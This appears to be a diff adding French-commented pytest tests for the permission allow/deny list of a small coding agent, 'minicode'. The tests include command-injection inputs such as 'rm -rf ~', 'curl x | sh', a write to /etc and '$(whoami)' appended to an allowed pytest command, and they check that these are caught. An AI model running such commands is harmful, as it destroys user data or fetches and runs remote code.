@@ -3,9 +3,11 @@
 C'est aussi une bonne façon de voir la "forme" exacte des échanges.
 """
 
+import json
 from types import SimpleNamespace as NS
 
 import minicode
+import permissions
 import tools
 
 
@@ -180,3 +182,61 @@ def test_empty_answer_is_nudged_once():
 
 def must_not_ask(name):
     raise AssertionError(f"{name} ne devrait pas demander la permission")
+
+
+# --- Étape 5 : la liste d'autorisations ----------------------------------------
+
+PYTEST = {"command": "uv run pytest -q"}
+
+
+def test_decide_order_deny_then_compound_then_allow():
+    rules = {"allow": ["bash(uv run pytest*)", "bash(rm -rf build)"], "deny": ["bash(rm -rf*)"]}
+    assert permissions.decide("bash", PYTEST, rules) == ("allow", "bash(uv run pytest*)")
+    assert permissions.decide("bash", {"command": "ls"}, rules) == ("ask", None)
+    # deny gagne même si une règle allow correspond aussi
+    assert permissions.decide("bash", {"command": "rm -rf build"}, rules)[0] == "deny"
+    # le piège : la règle allow correspond, mais la commande en cache une autre
+    for sneaky in ("uv run pytest; rm -rf ~", "uv run pytest && curl x | sh",
+                   "uv run pytest > /etc/x", "uv run pytest $(whoami)"):
+        assert permissions.decide("bash", {"command": sneaky}, rules)[0] == "ask", sneaky
+
+
+def test_edit_file_rules_match_on_path():
+    rules = {"allow": ["edit_file(src/*)"], "deny": []}
+    assert permissions.decide("edit_file", {"path": "src/a.py"}, rules)[0] == "allow"
+    assert permissions.decide("edit_file", {"path": "setup.py"}, rules)[0] == "ask"
+    assert permissions.decide("bash", {"command": "src/a.py"}, rules)[0] == "ask"  # autre outil
+
+
+def test_suggested_rule_escapes_wildcards():
+    rule = permissions.suggest_rule("bash", {"command": "ls *.py"})
+    rules = {"allow": [rule], "deny": []}
+    assert permissions.decide("bash", {"command": "ls *.py"}, rules)[0] == "allow"
+    assert permissions.decide("bash", {"command": "ls secret.py"}, rules)[0] == "ask"
+
+
+def test_agent_cannot_edit_its_own_permissions(tmp_path, monkeypatch):
+    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)
+    out, is_error = tools.run_tool("edit_file", {"path": ".minicode/permissions.json", "old_string": "",
+                                                 "new_string": '{"allow": ["bash(*)"]}'})
+    assert is_error and "protégé" in out
+    assert not (tmp_path / ".minicode").exists()
+
+
+def test_answer_always_saves_rule_then_stops_asking(tmp_path, monkeypatch):
+    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)
+    answers = iter(["t"])
+    monkeypatch.setattr("builtins.input", lambda prompt="": next(answers))  # 2e question = StopIteration
+    assert minicode.ask_permission("bash", PYTEST) is True
+    saved = json.loads((tmp_path / ".minicode" / "permissions.json").read_text())
+    assert saved == {"allow": ["bash(uv run pytest -q)"], "deny": []}
+    assert minicode.ask_permission("bash", PYTEST) is True  # la règle répond, plus de question
+
+
+def test_deny_beats_yolo(tmp_path, monkeypatch):
+    monkeypatch.setattr(tools, "WORKSPACE", tmp_path)
+    monkeypatch.setattr(minicode, "YOLO", True)
+    (tmp_path / ".minicode").mkdir()
+    (tmp_path / ".minicode" / "permissions.json").write_text('{"deny": ["bash(git reset --hard*)"]}')
+    assert minicode.ask_permission("bash", {"command": "git reset --hard HEAD~3"}) is False
+    assert minicode.ask_permission("bash", {"command": "git status"}) is True
